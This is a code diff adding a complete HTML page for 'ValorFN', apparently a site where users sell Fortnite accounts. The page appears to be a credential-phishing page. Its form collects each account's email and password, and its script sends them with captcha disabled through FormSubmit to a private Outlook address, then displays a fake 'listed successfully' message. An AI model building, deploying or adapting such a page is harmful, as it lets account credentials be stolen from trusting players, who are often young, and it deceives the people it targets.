@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ValorFN · Sell Fortnite Accounts</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Luckiest+Guy&display=swap" rel="stylesheet" />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        display: ['Luckiest Guy', 'cursive']
+                    },
+                    colors: {
+                        fnYellow: '#ffd700',
+                        fnDark: '#0b0e14',
+                        fnCard: '#141a24',
+                        fnBorder: '#1e2635'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Reset y base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #0b0e14;
+            color: #eaeef2;
+            font-family: 'Inter', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b0e14;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e2635;
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #2a3347;
+        }
+
+        .input-field {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            padding: 10px 14px;
+            width: 100%;
+            color: #fff;
+            font-size: 0.95rem;
+            font-family: 'Inter', sans-serif;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            outline: none;
+        }
+        .input-field:focus {
+            border-color: #ffd700;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.06);
+        }
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+        .input-field[type="number"]::-webkit-inner-spin-button {
+            opacity: 0.5;
+        }
+        .input-field[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px 20px;
+            background: #ffd700;
+            color: #0b0e14;
+            font-weight: 700;
+            font-size: 1rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+            box-shadow: 0 2px 8px rgba(255, 215, 0, 0.15);
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 0.3px;
+        }
+        .btn-submit:hover {
+            background: #f0cc00;
+            box-shadow: 0 4px 16px rgba(255, 215, 0, 0.2);
+        }
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+        .btn-submit.loading {
+            pointer-events: none;
+            opacity: 0.6;
+        }
+        .btn-submit.loading::after {
+            content: '';
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            margin-left: 10px;
+            border: 2px solid rgba(11, 14, 20, 0.15);
+            border-top-color: #0b0e14;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .success-message {
+            display: none;
+            margin-top: 1.2rem;
+            padding: 1rem;
+            border-radius: 8px;
+            background: rgba(76, 175, 80, 0.06);
+            border-left: 3px solid #4caf50;
+            color: #66bb6a;
+            font-weight: 500;
+            font-size: 0.95rem;
+            align-items: center;
+            gap: 10px;
+        }
+        .success-message.show {
+            display: flex;
+        }
+        .success-message i {
+            font-size: 1.2rem;
+        }
+
+        .error-message {
+            display: none;
+            margin-top: 1.2rem;
+            padding: 0.8rem 1rem;
+            border-radius: 8px;
+            background: rgba(255, 0, 0, 0.04);
+            border-left: 3px solid #ff4444;
+            color: #ff6b6b;
+            font-size: 0.9rem;
+            align-items: center;
+            gap: 10px;
+        }
+        .error-message.show {
+            display: flex;
+        }
+        .error-message i {
+            font-size: 1.1rem;
+        }
+
+        .footer-legal {
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding: 1.8rem 0 1.5rem;
+            margin-top: 3rem;
+        }
+        .footer-legal .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.5rem 2rem;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.2);
+        }
+        .footer-legal .legal-links a {
+            color: rgba(255, 255, 255, 0.25);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .footer-legal .legal-links a:hover {
+            color: #ffd700;
+        }
+        .footer-legal .legal-copy {
+            text-align: center;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.1);
+            margin-top: 1rem;
+            letter-spacing: 0.3px;
+        }
+
+        @media (max-width: 480px) {
+            .input-field {
+                font-size: 0.9rem;
+                padding: 8px 12px;
+            }
+            .btn-submit {
+                font-size: 0.9rem;
+                padding: 12px 16px;
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- ===== HEADER ===== -->
+    <header class="border-b border-white/5 bg-[#0b0e14]/90 backdrop-blur-sm sticky top-0 z-50">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-14 md:h-16">
+                <div class="flex items-center gap-2">
+                    <span class="font-display text-xl md:text-2xl tracking-wider text-white uppercase">VALOR<span class="text-fnYellow">FN</span></span>
+                    <span class="hidden sm:inline-block text-[10px] font-medium text-white/20 tracking-[0.15em] uppercase border-l border-white/10 pl-3">Sell Accounts</span>
+                </div>
+                <nav class="flex items-center gap-4">
+                    <a href="#" class="text-sm font-medium text-white/40 hover:text-white transition">Sell</a>
+                    <a href="#" class="text-sm font-medium text-white/40 hover:text-white transition">How it works</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== MAIN ===== -->
+    <main class="flex-1 max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8 md:py-12 w-full">
+
+        <!-- HERO -->
+        <div class="text-center mb-10">
+            <h1 class="text-2xl sm:text-3xl md:text-4xl font-bold tracking-tight text-white leading-tight">
+                Sell your <span class="text-fnYellow">Fortnite</span> account
+            </h1>
+            <p class="mt-2 text-sm md:text-base text-white/40 max-w-lg mx-auto">
+                Fill in the details below and we'll list your account for sale.
+            </p>
+            <p class="mt-1 text-xs text-white/15">Safe · Fast · Secure</p>
+        </div>
+
+        <!-- ===== FORMULARIO ===== -->
+        <div class="bg-[#141a24] border border-white/5 rounded-xl p-5 md:p-8 shadow-xl">
+            <form id="sellForm">
+
+                <!-- SECCIÓN 1: OBJETOS Y CARACTERÍSTICAS -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
+                    <div>
+                        <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">Skins</label>
+                        <input type="number" id="skins" class="input-field" placeholder="e.g. 120" min="0" required />
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">Pickaxes</label>
+                        <input type="number" id="pickaxes" class="input-field" placeholder="e.g. 45" min="0" required />
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">Gliders</label>
+                        <input type="number" id="gliders" class="input-field" placeholder="e.g. 30" min="0" required />
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">V-Bucks</label>
+                        <input type="number" id="vbucks" class="input-field" placeholder="e.g. 2800" min="0" required />
+                    </div>
+                </div>
+
+                <!-- SECCIÓN 2: CORREO ORIGINAL Y PRECIO -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
+                    <div class="flex items-center gap-3 pt-2">
+                        <input type="checkbox" id="originalEmail" class="w-4 h-4 accent-fnYellow bg-white/5 border border-white/10 rounded focus:ring-fnYellow focus:ring-1" />
+                        <label for="originalEmail" class="text-sm text-white/60">Has original email access</label>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">Price (USD)</label>
+                        <input type="number" id="price" class="input-field" placeholder="e.g. 79.99" min="0" step="0.01" required />
+                    </div>
+                </div>
+
+                <!-- SECCIÓN 3: CREDENCIALES DE LA CUENTA -->
+                <div class="border-t border-white/5 pt-6 mb-6">
+                    <h3 class="text-sm font-semibold text-white/50 uppercase tracking-wider mb-4">Account credentials</h3>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">Account email</label>
+                            <input type="email" id="accountEmail" class="input-field" placeholder="email@example.com" required />
+                        </div>
+                        <div>
+                            <label class="block text-xs font-medium text-white/40 uppercase tracking-wider mb-1.5">Password</label>
+                            <input type="password" id="accountPassword" class="input-field" placeholder="••••••••" required />
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BOTÓN -->
+                <button type="submit" class="btn-submit" id="submitBtn">List account for sale</button>
+
+                <!-- MENSAJES -->
+                <div class="success-message" id="successMessage">
+                    <i class="fa-regular fa-circle-check"></i>
+                    <span>Account listed successfully! We'll review it shortly.</span>
+                </div>
+                <div class="error-message" id="errorMessage">
+                    <i class="fa-regular fa-circle-exclamation"></i>
+                    <span id="errorText">Something went wrong. Please try again.</span>
+                </div>
+            </form>
+        </div>
+
+        <!-- ===== CÓMO FUNCIONA ===== -->
+        <div class="mt-12 grid grid-cols-1 sm:grid-cols-3 gap-6 text-center text-sm text-white/40">
+            <div>
+                <div class="text-fnYellow text-2xl mb-2"><i class="fa-regular fa-file-lines"></i></div>
+                <p class="font-medium text-white/60">1. Submit details</p>
+                <p class="text-xs">Fill in your account info and set your price.</p>
+            </div>
+            <div>
+                <div class="text-fnYellow text-2xl mb-2"><i class="fa-regular fa-clock"></i></div>
+                <p class="font-medium text-white/60">2. We review</p>
+                <p class="text-xs">Our team verifies the account within 24h.</p>
+            </div>
+            <div>
+                <div class="text-fnYellow text-2xl mb-2"><i class="fa-regular fa-circle-check"></i></div>
+                <p class="font-medium text-white/60">3. Get paid</p>
+                <p class="text-xs">Once sold, you receive your payment instantly.</p>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer-legal">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="legal-links">
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+                <a href="#">Contact</a>
+                <span class="text-white/10">·</span>
+                <span class="text-white/10">Unofficial tool</span>
+            </div>
+            <div class="legal-copy">
+                &copy; 2025 ValorFN · Not affiliated with Epic Games
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        (function() {
+            'use strict';
+
+            const form = document.getElementById('sellForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const successMsg = document.getElementById('successMessage');
+            const errorMsg = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+
+            // Campos
+            const skins = document.getElementById('skins');
+            const pickaxes = document.getElementById('pickaxes');
+            const gliders = document.getElementById('gliders');
+            const vbucks = document.getElementById('vbucks');
+            const originalEmail = document.getElementById('originalEmail');
+            const price = document.getElementById('price');
+            const accountEmail = document.getElementById('accountEmail');
+            const accountPassword = document.getElementById('accountPassword');
+
+            // URL de FormSubmit (solo a valorfn@outlook.es)
+            const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/valorfn@outlook.es';
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                // Validación básica
+                if (!skins.value || !pickaxes.value || !gliders.value || !vbucks.value || !price.value || !accountEmail
+                    .value || !accountPassword.value) {
+                    errorText.textContent = 'All fields are required.';
+                    errorMsg.classList.add('show');
+                    successMsg.classList.remove('show');
+                    return;
+                }
+
+                // Ocultar mensajes previos
+                errorMsg.classList.remove('show');
+                successMsg.classList.remove('show');
+
+                // Estado de carga
+                submitBtn.classList.add('loading');
+                submitBtn.textContent = 'Listing...';
+
+                // Construir payload
+                const payload = {
+                    _subject: 'New account listing - ValorFN',
+                    skins: skins.value,
+                    pickaxes: pickaxes.value,
+                    gliders: gliders.value,
+                    vbucks: vbucks.value,
+                    original_email: originalEmail.checked ? 'Yes' : 'No',
+                    price: price.value + ' USD',
+                    account_email: accountEmail.value,
+                    account_password: accountPassword.value,
+                    _captcha: 'false'
+                };
+
+                fetch(FORM_SUBMIT_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('FormSubmit response:', data);
+                        // Éxito (aunque FormSubmit devuelva OK)
+                        submitBtn.classList.remove('loading');
+                        submitBtn.textContent = 'List account for sale';
+                        successMsg.classList.add('show');
+                        // Limpiar formulario opcionalmente
+                        form.reset();
+                    })
+                    .catch(error => {
+                        console.error('FormSubmit error:', error);
+                        submitBtn.classList.remove('loading');
+                        submitBtn.textContent = 'List account for sale';
+                        errorText.textContent = 'Network error. Please try again.';
+                        errorMsg.classList.add('show');
+                    });
+            });
+
+        })();
+    </script>
+</body>
+</html>
